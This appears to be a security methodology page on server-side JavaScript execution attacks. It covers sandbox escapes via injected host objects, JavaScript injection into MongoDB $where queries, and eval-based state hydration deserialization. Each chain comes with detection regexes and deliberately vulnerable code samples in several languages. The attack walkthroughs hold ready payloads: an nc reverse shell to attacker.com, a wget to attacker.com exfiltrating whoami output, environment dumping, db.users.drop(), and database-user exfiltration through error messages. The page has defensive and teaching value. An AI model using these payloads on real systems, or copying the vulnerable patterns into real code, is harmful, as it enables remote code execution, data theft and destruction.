# JavaScript Execution

## Check List

## Methodology

### Black Box

### White Box

#### Native Sandbox Escape via Host-Object Reference Bleeding in Tenant Integration Hubs

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on API architectures functioning as Integration Hubs, Workflow Orchestrators, or Data Transformation pipelines (e.g., Webhook dispatchers, iPaaS solutions) that allow Tenant Administrators to define custom data-mapping logic
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Custom Transformer" architecture. To prevent establishing millions of static API integrations, the platform empowers tenants to write lightweight JavaScript snippets. These snippets ingest incoming JSON payloads, mutate the schema, and return the transformed object for downstream dispatch
{% endstep %}

{% step %}
Investigate the Execution Environment optimization. Spinning up a dedicated Docker container for every single 10-line webhook transformation incurs catastrophic memory overhead and cold-start latency. To optimize density, platform engineers run thousands of tenant scripts concurrently inside a single monolithic backend pod, utilizing embedded JavaScript engines (e.g., Node.js `vm`, C# `Jint`, Java `GraalVM/Nashorn`, PHP `V8Js`)
{% endstep %}

{% step %}
Analyze the Context Isolation configuration. To secure the multi-tenant engine, developers deploy "Sandboxed" execution contexts. They explicitly disable access to the global environment (e.g., `process`, `require`, `window`) and strip the standard library
{% endstep %}

{% step %}
Discover the utility injection mechanism. A purely isolated JS snippet is virtually useless; it cannot format dates, hash strings, or make HTTP requests. To provide utility, the backend developers explicitly inject safe "Host Objects" (e.g., a `Logger`, a `CryptoHelper`, or a restricted `HttpClient`) directly from the native host language into the isolated JavaScript context
{% endstep %}

{% step %}
Understand the architectural assumption: The developers assume that injecting a statically typed host object exposes _only_ the specific methods defined on that class interface (e.g., `logger.info()`). They fundamentally believe the sandbox barrier prevents the JS execution thread from looking "behind" the injected object
{% endstep %}

{% step %}
Recognize the Reflection/Prototype bleeding vulnerability: Embedded JavaScript engines do not pass host objects by value; they pass them by _reference_. In heavily reflective managed languages (C#, Java) and in the Node.js V8 runtime, every object maintains a pointer to its parent execution context, runtime assembly, or native constructor
{% endstep %}

{% step %}
Formulate the Sandbox Escape payload. You must write a JavaScript payload that accepts the injected host object, traverses its internal prototype chain or utilizes native host-language reflection, and retrieves a reference to the global runtime execution environment
{% endstep %}

{% step %}
Construct the language-specific escape sequence, Node.js (`vm`): Traverse the context via `this.constructor.constructor('return process')(),` Java (`Nashorn`/`Graal`): Access `hostObject.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null)` , C# (`Jint`/`ClearScript`): Access `hostObject.GetType().Assembly.GetType("System.Diagnostics.Process")`&#x20;
{% endstep %}

{% step %}
Navigate to the Tenant Administration dashboard and create a new Webhook Transformation rule
{% endstep %}

{% step %}
Inject the Sandbox Escape payload as your custom mapping logic. Target a high-value OS command (e.g., exfiltrating environment variables or establishing a reverse shell)
{% endstep %}

{% step %}
Save the integration and trigger the webhook pipeline by submitting a test payload
{% endstep %}

{% step %}
The backend initializes the sandbox, injects the `Logger` utility, and executes your script. Your script leverages the injected reference, escapes the JavaScript isolation barrier, transitions into the native execution environment of the backend pod, and executes the OS command, converting a controlled JS execution feature into absolute Remote Code Execution (RCE)

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:new\s+Engine\s*\(\s*\)\s*\.SetValue\s*\(\s*[^,]+,\s*new\s+[A-Za-z_][A-Za-z0-9_<>]*\s*\(\s*\)|\.SetValue\s*\(\s*["'][^"']+["']\s*,\s*new\s+[A-Za-z_][A-Za-z0-9_<>]*\s*\(\s*\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:ScriptEngineManager\s*\(\s*\)\s*\.getEngineByName\s*\(\s*"[^"]+"\s*\)\s*;\s*engine\.put\s*\(\s*[^,]+,\s*new\s+[A-Za-z_][A-Za-z0-9_<>]*\s*\(\s*\)|engine\.put\s*\(\s*"[^"]+"\s*,\s*new\s+[A-Za-z_][A-Za-z0-9_<>]*\s*\(\s*\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$v8->executeString\s*\(.*?\)\s*;\s*\$v8->[A-Za-z_][A-Za-z0-9_]*\s*=|\$v8->[A-Za-z_][A-Za-z0-9_]*\s*=\s*new\s+[A-Za-z_][A-Za-z0-9_]*\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:vm\.createContext\s*\(\s*\{[\s\S]{0,150}?[A-Za-z_][A-Za-z0-9_]*\s*:\s*new\s+[A-Za-z_][A-Za-z0-9_]*\s*\(\s*\)|createContext\s*\(\s*\{[\s\S]{0,150}?new\s+[A-Za-z_][A-Za-z0-9_]*\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
new\s+Engine\(\)\.SetValue\(.*,\s*new\s+[A-Za-z_][A-Za-z0-9_]*\(\)\)|\.SetValue\(.*new\s+[A-Za-z_][A-Za-z0-9_]*\(
```
{% endtab %}

{% tab title="Java" %}
```regexp
ScriptEngineManager\(\)\.getEngineByName\(.*\).*engine\.put\(.*new\s+[A-Za-z_][A-Za-z0-9_]*\(\)|engine\.put\(.*new\s+[A-Za-z_][A-Za-z0-9_]*\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$v8->executeString\(.*\);\s*\$v8->[A-Za-z_][A-Za-z0-9_]*\s*=|\$v8->[A-Za-z_][A-Za-z0-9_]*\s*=\s*new\s+[A-Za-z_][A-Za-z0-9_]*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
vm\.createContext\(\{.*new\s+[A-Za-z_][A-Za-z0-9_]*\(\)|createContext\(\{.*new\s+[A-Za-z_][A-Za-z0-9_]*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class WebhookTransformerService
{
    public string TransformPayload(string tenantJsCode, string rawJson)
    {
        // [1]
        // [2]
        // Utilizing Jint to execute tenant JS inside the .NET application
        var engine = new Engine(cfg => cfg
            // Disables CLR interop to "secure" the sandbox
            .AllowClr(false) 
            .TimeoutInterval(TimeSpan.FromSeconds(2))
        );

        // [3]
        // [4]
        // Injecting a native C# object into the JS execution context to provide utility.
        // Even though AllowClr is false, the injected object retains its native System.Type methods.
        var safeLogger = new TenantLogger();
        engine.SetValue("logger", safeLogger);
        engine.SetValue("payload", rawJson);

        var result = engine.Evaluate(tenantJsCode).AsString();
        return result;
    }
}

public class TenantLogger {
    public void Info(string message) { /* Safe logging logic */ }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class WebhookTransformerService {

    public String transformPayload(String tenantJsCode, String rawJson) throws ScriptException {
        // [1]
        // [2]
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");

        // [3]
        // [4]
        // The developer assumes the sandbox isolates the script. 
        // By injecting a Java instance, the script gains access to the java.lang.Class reference.
        TenantLogger safeLogger = new TenantLogger();
        engine.put("logger", safeLogger);
        engine.put("payload", rawJson);

        Object result = engine.eval(tenantJsCode);
        return result.toString();
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class WebhookTransformerService
{
    public function transformPayload(string $tenantJsCode, string $rawJson): string
    {
        // [1]
        // [2]
        $v8 = new \V8Js();

        // [3]
        // [4]
        // Exposing a PHP object to the V8 engine
        $safeLogger = new TenantLogger();
        $v8->logger = $safeLogger;
        $v8->payload = $rawJson;

        // V8Js allows PHP object method calling. Attackers can leverage PHP magic methods
        // or reflection via the exposed object to instantiate forbidden classes.
        $result = $v8->executeString($tenantJsCode);

        return $result;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const vm = require('vm');

class WebhookTransformerService {
    static transformPayload(tenantJsCode, rawJson) {
        // [1]
        // [2]
        // [3]
        // [4]
        // The developer injects a custom utility class into the vm context.
        // Objects passed into vm.createContext are passed by reference.
        const sandbox = {
            logger: new TenantLogger(),
            payload: rawJson
        };

        vm.createContext(sandbox);

        // The script can access logger.constructor.constructor('return process')()
        const result = vm.runInContext(tenantJsCode, sandbox, { timeout: 2000 });
        
        return result;
    }
}

class TenantLogger {
    info(msg) { console.log(msg); }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes dynamic data transformations at scale by embedding lightweight JavaScript execution engines directly into the backend microservices, \[2] To prevent tenants from executing malicious system commands, the engine is explicitly configured to isolate the execution thread from the underlying operating system and core language runtime, \[3] Developers recognize that tenant scripts require basic external capabilities (like logging output or computing hashes) to be functional, \[4] The execution paradox. Developers believe that explicitly whitelisting an object restricts the attacker's execution surface solely to the methods declared on that object's interface. However, the injected object acts as a bridge across the trust boundary. Because managed runtimes attach deep reflection metadata and prototype chains to all instantiated objects, the attacker leverages the seemingly benign `Logger` object to reflectively invoke the underlying framework's root assembly constructors, effortlessly shattering the sandbox and achieving full OS-level RCE

```http
// 1. Attacker targets a Node.js integration hub using the 'vm' module for script isolation.
// 2. Attacker crafts a JS payload that utilizes the injected 'logger' object to climb the prototype chain.
// Node.js Payload: `const process = logger.constructor.constructor('return process')(); process.mainModule.require('child_process').execSync('env > /tmp/env.txt'); return payload;`

POST /api/v1/integrations/webhooks/transform-rules HTTP/1.1
Host: hub.enterprise.tld
Authorization: Bearer <tenant_token>
Content-Type: application/json

{
  "ruleName": "Data Enrichment",
  "jsCode": "const proc = logger.constructor.constructor('return process')(); const result = proc.mainModule.require('child_process').execSync('nc -e /bin/sh attacker.com 4444'); return payload;"
}

// 3. The API Gateway saves the integration rule.
// 4. The Attacker triggers a generic webhook event to ingest a payload.

POST /api/v1/events/ingest HTTP/1.1
Host: hub.enterprise.tld
Content-Type: application/json

{"data": "test"}

// 5. The backend spins up the `vm` context and injects `logger`.
// 6. The `vm` evaluates the attacker's code. 
// 7. The code accesses `logger.constructor` (Object), then `.constructor` (Function).
// 8. It invokes the Function constructor, dynamically generating a new function outside the sandbox.
// 9. It returns the global `process` object from the main Node.js event loop.
// 10. The attacker utilizes `child_process` to spawn a reverse shell from the host container.
```
{% endstep %}

{% step %}
To support complex B2B workflow customizations without incurring the massive compute overhead of isolating individual Docker containers, enterprise architects embedded native JavaScript execution engines directly into the core integration backend. This optimization relied entirely on the assumption that software sandboxes provided absolute isolation. To maintain usability, developers intentionally punctured the sandbox, injecting utility objects from the host language into the isolated context. They erroneously assumed that the execution boundary was restricted to the declared interface of the injected object. The attacker weaponized this trust by utilizing native language reflection and prototype traversal. By pivoting off the injected utility object, the attacker walked the object's ancestry graph, ultimately acquiring a reference to the global runtime execution context. This traversal seamlessly bypassed the engine's isolation constraints, escalating a restricted JS execution context into absolute, host-level Remote Code Execution
{% endstep %}
{% endstepper %}

***

#### Server-Side JavaScript Execution via AST-to-JS Compilation Injection in NoSQL Data Grids

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on Data-as-a-Service (DaaS) APIs, headless CMS platforms, or advanced operational dashboards that expose highly flexible, JSON-based query languages (e.g., allowing users to define nested `AND`/`OR` conditions, Regex filters, and cross-field comparisons)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend query translation and Data Grid access layers
{% endstep %}

{% step %}
Identify the "Database Execution Delegation" architecture. In hyper-scale environments, pulling millions of documents into application memory to execute complex filtering logic (e.g., `revenue > (expenses * 1.5)`) causes immediate OOM failures. To optimize this, the API delegates the execution to the database's native execution engine (e.g., MongoDB's `$where` clause, CosmosDB UDFs, or ArangoDB AQL)
{% endstep %}

{% step %}
Investigate the API AST Translator. The frontend submits an Abstract Syntax Tree (AST) in JSON format (e.g., `{"operator": "greaterThan", "field": "revenue", "compareField": "expenses"}`). The backend API parses this JSON and must dynamically translate it into the specific JavaScript format required by the database engine
{% endstep %}

{% step %}
Analyze the JS String Builder. Because the database engine requires a raw JavaScript function string (e.g., `function() { return this.revenue > this.expenses; }`), the backend developer utilizes string concatenation or template interpolation to synthesize the final database query from the parsed JSON parameters
{% endstep %}

{% step %}
Discover the fatal validation gap: The developer strictly validates the `operator` field against an allowed list (e.g., `['greaterThan', 'equals']`), preventing structural query manipulation. However, they assume the `field` and `compareField` inputs represent benign column names, and they concatenate these values directly into the JavaScript execution string without utilizing a parameterized context bounds
{% endstep %}

{% step %}
Understand the vulnerability: While SQL Injection is heavily mitigated by parameterized queries, native Server-Side JavaScript evaluation within NoSQL databases often lacks standard parameterization support for dynamic field evaluations. By injecting JavaScript control characters into the `field` string, an attacker can break out of the functional enclosure
{% endstep %}

{% step %}
Formulate the AST-to-JS Forgery payload. Identify a complex filtering endpoint
{% endstep %}

{% step %}
Determine the logical enclosure synthesized by the backend. (e.g., `return this.[FIELD] > this.[COMPARE_FIELD];`)
{% endstep %}

{% step %}
Construct a payload that closes the expected property accessor, injects arbitrary Server-Side JavaScript, and comments out or neutralizes the trailing syntax
{% endstep %}

{% step %}
Payload structure: Set `field` to: `revenue; return false; }(); db.users.drop(); function dummy() { return this.id`&#x20;
{% endstep %}

{% step %}
Submit the JSON AST payload to the dynamic query endpoint
{% endstep %}

{% step %}
The API translates the payload, concatenating your strings. The synthesized JS payload becomes: `function() { return this.revenue; return false; }(); db.users.drop(); function dummy() { return this.id > this.expenses; }`
{% endstep %}

{% step %}
The API submits the raw JS string to the NoSQL database engine. The database executes the JavaScript context globally across the dataset to filter the records. Your injected payload executes natively within the database node, resulting in direct SSJS Remote Code Execution inside the persistence layer

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(\.Where\(\$"this\.\{[^}]+\}\s*[=!<>]=?)|(String\.Format\(\s*"function\(\)\s*\{\s*return\s*this\.%s)|(string\s+\w+\s*=\s*\$"function\(\)\s*\{\s*return\s*this\.\{[^}]+\})
```
{% endtab %}

{% tab title="Java" %}
```regexp
(String\s+\w+\s*=\s*String\.format\(\s*"function\(\)\s*\{\s*return\s*this\.%s)|(String\.format\(\s*"function\(\)\s*\{\s*return\s*this\.[^"]*)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*"function\(\)\s*\{\s*return\s*this\."\s*\.\s*\$[A-Za-z_][A-Za-z0-9_]*\s*\.)|(\$jsFunction\s*=.*function\(\)\s*\{\s*return\s*this\.)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(let\s+\w+\s*=\s*`function\(\)\s*\{\s*return\s*this\.\$\{[^}]+\}\s*[=!<>]=?)|(const\s+\w+\s*=\s*`function\(\)\s*\{\s*return\s*this\.\$\{[^}]+\})
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\.Where\(\$"this\.\{[^}]+\}\s*[=!<>]=?|String\.Format\("function\(\)\{return\s*this\.%s|string\s+\w+\s*=\s*\$"function\(\)\{return\s*this\.
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\s+\w+\s*=\s*String\.format\("function\(\)\{return\s*this\.%s|String\.format\("function\(\)\{return\s*this\.
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*"function\(\)\{return\s*this\."\s*\.\s*\$[A-Za-z_][A-Za-z0-9_]*|\$jsFunction\s*=.*function\(\)\{return\s*this\.
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
let\s+\w+\s*=\s*`function\(\)\{return\s*this\.\$\{[^}]+\}|const\s+\w+\s*=\s*`function\(\)\{return\s*this\.\$\{[^}]+\}
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/data/filter")]
public async Task<IActionResult> FilterData([FromBody] QueryAst filterAst)
{
    if (filterAst.Operator == "crossFieldGreaterThan")
    {
        // [1]
        // [2]
        // [3]
        // [4]
        // Synthesizing a JS execution string for CosmosDB UDFs or ArangoDB AQL
        var jsFilter = string.Format("function() {{ return this.{0} > this.{1}; }}", 
                                     filterAst.Field, 
                                     filterAst.CompareField);

        var queryDefinition = new QueryDefinition("SELECT * FROM c WHERE udf.evaluateFilter(c, @jsFilter)")
            .WithParameter("@jsFilter", jsFilter);

        var results = await _cosmosContainer.GetItemQueryIterator<dynamic>(queryDefinition).ReadNextAsync();
        
        return Ok(results);
    }
    return BadRequest();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("/api/v1/data/filter")
public ResponseEntity<?> filterData(@RequestBody QueryAst filterAst) {
    
    if ("crossFieldGreaterThan".equals(filterAst.getOperator())) {
        // [1]
        // [2]
        // [3]
        // [4]
        // Constructing a MongoDB Server-Side JavaScript evaluation string
        String jsQuery = "function() { return this." + filterAst.getField() + 
                         " > this." + filterAst.getCompareField() + "; }";

        BasicQuery query = new BasicQuery("{ $where: '" + jsQuery + "' }");
        List<Document> results = mongoTemplate.find(query, Document.class, "collectionName");

        return ResponseEntity.ok(results);
    }
    return ResponseEntity.badRequest().build();
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class DataFilterController extends Controller
{
    public function filterData(Request $request)
    {
        $filterAst = $request->json()->all();

        if ($filterAst['operator'] === 'crossFieldGreaterThan') {
            // [1]
            // [2]
            // [3]
            // [4]
            $field1 = $filterAst['field'];
            $field2 = $filterAst['compareField'];

            $jsQuery = "function() { return this.{$field1} > this.{$field2}; }";

            $results = DB::connection('mongodb')->collection('data')
                ->whereRaw(['$where' => $jsQuery])
                ->get();

            return response()->json($results);
        }

        return response()->json(['error' => 'Invalid operator'], 400);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/data/filter', async (req, res) => {
    let filterAst = req.body;

    // [1]
    // [2]
    // The API translates the JSON AST into a MongoDB $where JavaScript query
    // to allow complex cross-field arithmetic comparisons.
    if (filterAst.operator === 'crossFieldGreaterThan') {
        let field1 = filterAst.field;
        let field2 = filterAst.compareField;

        // [3]
        // [4]
        // Fatal string interpolation. The developer assumes 'field' and 'compareField' 
        // are standard alphanumeric column names.
        let jsQuery = `function() { return this.${field1} > this.${field2}; }`;

        // The query is passed to MongoDB's internal V8 engine
        let results = await Collection.find({ $where: jsQuery });

        return res.json(results);
    }

    res.status(400).send('Invalid operator');
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture supports highly complex data exploration, allowing enterprise users to define cross-field mathematical constraints that cannot be resolved via standard indexed lookups, \[2] To avoid pulling massive datasets into the application's memory space, developers delegate the execution of the complex logic directly to the database's native Server-Side JavaScript (SSJS) processing engine (e.g., MongoDB `$where`), \[3] The architecture relies on an intermediate JSON Abstract Syntax Tree (AST) to structure the user's intent. Developers strictly validate the logical operands (`greaterThan`), generating a false sense of security, \[4] The execution sink. Because NoSQL SSJS evaluation strings generally lack robust parameterization capabilities for dynamic field references, developers revert to raw string concatenation. The developer implicitly assumes that the `field` parameters contain mathematically safe alphanumeric representations of column headers. By injecting JavaScript enclosure-breaking characters, the attacker shatters the synthesized function structure, injecting native administrative commands directly into the database's V8 evaluation cycle

```http
// 1. Attacker interrogates the API and identifies a dynamic NoSQL filtering endpoint.
// 2. Attacker reverse-engineers the JS syntax based on application behavior and error messages.
// Expected Backend Format: function() { return this.[FIELD] > this.[COMPARE_FIELD]; }

// 3. Attacker crafts a payload to execute arbitrary JS, aiming to exfiltrate database users.
// Payload injected into 'compareField': 
// expenses; }; var ex = db.getUsers(); throw new Error(JSON.stringify(ex)); function dummy() { return this.id 

POST /api/v1/data/filter HTTP/1.1
Host: data.enterprise.tld
Authorization: Bearer <valid_token>
Content-Type: application/json

{
  "operator": "crossFieldGreaterThan",
  "field": "revenue",
  "compareField": "expenses; }; var ex = db.getUsers(); throw new Error(JSON.stringify(ex)); function dummy() { return this.id"
}

// 4. The backend API translates the AST into the raw JS string:
// function() { return this.revenue > this.expenses; }; var ex = db.getUsers(); throw new Error(JSON.stringify(ex)); function dummy() { return this.id; }

// 5. The backend transmits the payload to MongoDB.
// 6. MongoDB's V8 engine executes the script across the documents.
// 7. The execution extracts the database users, and throws them in a fatal Exception.
// 8. The backend API catches the DB exception and returns the Error string to the attacker.

HTTP/1.1 500 Internal Server Error
Content-Type: application/json

{
  "error": "MongoError: {\"users\":[{\"user\":\"admin\",\"db\":\"admin\",\"roles\":[{\"role\":\"root\",\"db\":\"admin\"}]}]}"
}
```
{% endstep %}

{% step %}
To fulfill extreme scalability requirements during complex, cross-field data filtering, backend engineers bypassed standard relational operations, delegating operational logic directly to NoSQL Server-Side JavaScript engines. This architecture effectively transformed the data persistence layer into an active compute node. To translate client-provided JSON instructions into native database syntax, developers utilized raw string interpolation. The security posture relied on the naive assumption that specifying an AST schema naturally shielded the execution pipeline from syntax injection. The attacker shattered this paradigm by embedding native Javascript closure semantics directly into the field identifier strings. When the backend synthesized the query, the attacker's payload fractured the expected logical closure and re-initialized a completely autonomous execution block. The NoSQL database obligingly processed the poisoned string, executing the attacker's administrative commands directly within the highly privileged data plane
{% endstep %}
{% endstepper %}

***

#### Implicit Code Execution via Isomorphic State Hydration Deserialization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on modern, highly dynamic web platforms utilizing Backend-For-Frontend (BFF) orchestrators integrated with Server-Side Rendering (SSR) frameworks (e.g., Next.js, Nuxt.js, Angular Universal)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API configuration and state hydration sequence
{% endstep %}

{% step %}
Identify the "Isomorphic State Hydration" architecture. In SSR applications, the backend API pre-renders the HTML page to optimize SEO and initial load times. To prevent the frontend from issuing immediate, redundant API calls when the client-side SPA takes over, the backend serializes the entire initial application state and injects it into a script tag in the HTML (e.g., `window.__INITIAL_STATE__ = {...}`)
{% endstep %}

{% step %}
Investigate the Serialization format. Standard `JSON.stringify()` drops critical programmatic structures like `Date` objects, `Map`, `Set`, and `RegExp`. To resolve this, platform engineers utilize advanced serializers (like Yahoo's `serialize-javascript`, or custom deserializers) that can encode these complex data structures into evaluable JavaScript expressions
{% endstep %}

{% step %}
Analyze the Configuration Pipeline. In complex multi-tenant applications, the BFF retrieves a dynamic "UI Configuration" JSON object from a central database. This object dictates complex visual behaviors (e.g., dynamic regex validation rules for custom tenant forms)
{% endstep %}

{% step %}
Discover the fatal deserialization behavior: Advanced serializers represent complex types as executable strings (e.g., a regex becomes `{"type":"RegExp","value":"/^\\d+$/"}`). To reconstruct this state on the frontend or intermediate SSR node, the deserializer uses highly dangerous pattern matching, checking if a string resembles an executable construct, and then evaluates it via `eval()` or `new Function()`&#x20;
{% endstep %}

{% step %}
Understand the trust boundary collapse: The SSR Node server assumes that any state retrieved from the internal BFF database is entirely trusted and strictly authored by system administrators. It fundamentally relies on the deserializer to safely reconstruct the objects
{% endstep %}

{% step %}
Formulate the Hydration Injection payload. You must discover a Mass Assignment vulnerability or a poorly sanitized input field that feeds directly into the tenant's UI Configuration blob
{% endstep %}

{% step %}
Construct a payload that perfectly mimics the execution signature targeted by the advanced deserializer. If the deserializer evaluates functions to reconstruct complex state, you must format your string to match a function signature
{% endstep %}

{% step %}
Payload structure: Update a custom tenant form field title or metadata property to: `{"customRegex": "function() { require('child_process').execSync('wget [http://attacker.com/$(whoami](http://attacker.com/$(whoami))'); return /.*/; }()" }`
{% endstep %}

{% step %}
Submit the payload. The BFF securely saves the string to the database
{% endstep %}

{% step %}
Trigger the SSR rendering pipeline by navigating to the public storefront or dashboard as a standard visitor
{% endstep %}

{% step %}
The SSR Node.js server queries the BFF for the tenant's UI state. The BFF returns the JSON
{% endstep %}

{% step %}
The SSR server applies the advanced deserializer to the JSON payload to reconstruct the Isomorphic state for the pre-rendering engine. The deserializer identifies the attacker's `function() {...}()` string signature. Believing it to be legitimate programmatic state authored by an internal engineer, the deserializer invokes `eval()` or `new Function()`. The payload detonates directly on the SSR server cluster, achieving SSJS RCE before the HTTP response is even dispatched to the client

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(deserialize\s*=\s*new\s+Function\s*\(\s*['"]return\s*['"]\s*\+\s*serializedState)|(return\s+eval\s*\(\s*['"]\(['"]\s*\+\s*str\s*\+\s*['"]\)['"]\s*\))|(Json(?:Convert)?\.DeserializeObject<.*>\(.*\)\s*.*DynamicInvoke)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(return\s+eval\s*\(\s*['"]\(['"]\s*\+\s*str\s*\+\s*['"]\)['"]\s*\))|(ScriptEngineManager\s*\(\)\.getEngineByName\(.*\).*eval\(.*serialized)|(ObjectInputStream\s*\(.*\).*(readObject|resolveObject))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(unserialize\s*\(.*['"]allowed_classes['"]\s*=>\s*true)|(unserialize\s*\([^)]*\))|(eval\s*\(\s*['"]\(['"]\s*\.\s*\$[A-Za-z_][A-Za-z0-9_]*\s*\.\s*['"]\)['"]\s*\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(JSON\.parse\s*\(.*,\s*function\s*\(\s*key\s*,\s*value\s*\)\s*\{\s*if\s*\(\s*typeof\s+value\s*===\s*['"]string['"]\s*&&\s*value\.startsWith\s*\(\s*['"]function['"]\s*\)\s*\)\s*return\s*eval)|(new\s+Function\s*\(\s*['"]return\s*['"]\s*\+\s*serializedState)|(return\s+eval\s*\(\s*['"]\(['"]\s*\+\s*str\s*\+\s*['"]\)['"]\s*\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
deserialize\s*=\s*new\s+Function\('return\s*'\s*\+\s*serializedState|return\s+eval\('\('\s*\+\s*str\s*\+\s*'\)'\)|Json(Convert)?\.DeserializeObject
```
{% endtab %}

{% tab title="Java" %}
```regexp
return\s+eval\('\('\s*\+\s*str\s*\+\s*'\)'\)|ScriptEngineManager\(\).*eval\(.*serialized|ObjectInputStream.*readObject
```
{% endtab %}

{% tab title="PHP" %}
```regexp
unserialize\(.*['"]allowed_classes['"]\s*=>\s*true|unserialize\(|eval\('\('\s*\.\s*\$
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
JSON\.parse\(.*function\(key,\s*value\).*value\.startsWith\('function'\).*eval|new\s+Function\('return\s*'\s*\+\s*serializedState|return\s+eval\('\('\s*\+\s*str\s*\+\s*'\)'\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/tenant/config")]
public async Task<IActionResult> UpdateTenantConfig([FromBody] Dictionary<string, object> configUpdates)
{
    var tenantId = User.GetTenantId();
    var tenantConfig = await _dbContext.TenantConfigs.FindAsync(tenantId);

    // [1]
    // [2]
    // BFF allows dynamic updates to the configuration JSON blob.
    var currentConfig = JObject.Parse(tenantConfig.JsonBlob);
    var updates = JObject.FromObject(configUpdates);

    // [3]
    // [4]
    // Mass Assignment vulnerability allows an attacker to overwrite deeply nested
    // fields, such as structural validation regexes or UI formatters, with malicious strings.
    currentConfig.Merge(updates, new JsonMergeSettings { MergeArrayHandling = MergeArrayHandling.Replace });
    
    tenantConfig.JsonBlob = currentConfig.ToString();
    await _dbContext.SaveChangesAsync();

    return Ok();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("/api/v1/tenant/config")
public ResponseEntity<?> updateConfig(@RequestBody Map<String, Object> updates, Principal principal) throws Exception {
    String tenantId = getTenantId(principal);
    TenantConfig config = configRepository.findById(tenantId).orElseThrow();

    // [1]
    // [2]
    ObjectMapper mapper = new ObjectMapper();
    ObjectNode currentConfig = (ObjectNode) mapper.readTree(config.getJsonBlob());
    JsonNode newUpdates = mapper.valueToTree(updates);

    // [3]
    // [4]
    // Merges the raw updates into the stored state configuration,
    // blinding storing the attacker's "function() { ... }" execution payload.
    ObjectReader updater = mapper.readerForUpdating(currentConfig);
    JsonNode merged = updater.readValue(newUpdates);

    config.setJsonBlob(merged.toString());
    configRepository.save(config);

    return ResponseEntity.ok().build();
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class SsrHydrationService
{
    public function renderPage($tenantId)
    {
        // [1]
        // [2]
        $rawState = Http::get("http://internal-bff/api/v1/tenant/{$tenantId}/config")->json();

        // [3]
        // [4]
        // If the architecture utilizes native serialization for rich state transfer
        // between internal microservices, unserialize() natively executes code 
        // via magic methods (__wakeup, __destruct) achieving immediate RCE.
        $hydratedState = unserialize($rawState['serialized_blob'], ['allowed_classes' => true]);

        $html = view('ssr-engine', ['state' => $hydratedState])->render();
        return response($html);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// SSR Node server bridging backend APIs to the React/Vue frontend
const express = require('express');
const axios = require('axios');

class SsrHydrationService {
    static async renderPage(req, res) {
        // [1]
        // [2]
        // Fetching multi-tenant UI configuration from the internal BFF
        let apiResponse = await axios.get(`http://internal-bff/api/v1/tenant/${req.params.tenantId}/config`);
        let rawState = apiResponse.data;

        // [3]
        // [4]
        // Fatal Deserializer: To support restoring complex JS objects (RegEx, Functions) 
        // returned by the internal API, the developer implemented a custom JSON reviver 
        // that executes dynamic strings.
        let hydratedState = JSON.parse(JSON.stringify(rawState), (key, value) => {
            if (typeof value === 'string') {
                if (value.startsWith('function') || value.startsWith('=>')) {
                    // Evaluates the string into a native JS function inside the Node.js server
                    return new Function(`return ${value}`)();
                }
                if (value.startsWith('REGEX:')) {
                    return new RegExp(value.substring(6));
                }
            }
            return value;
        });

        // The React/Vue engine pre-renders the HTML using the hydratedState
        let html = ReactEngine.renderToString(hydratedState);
        res.send(html);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
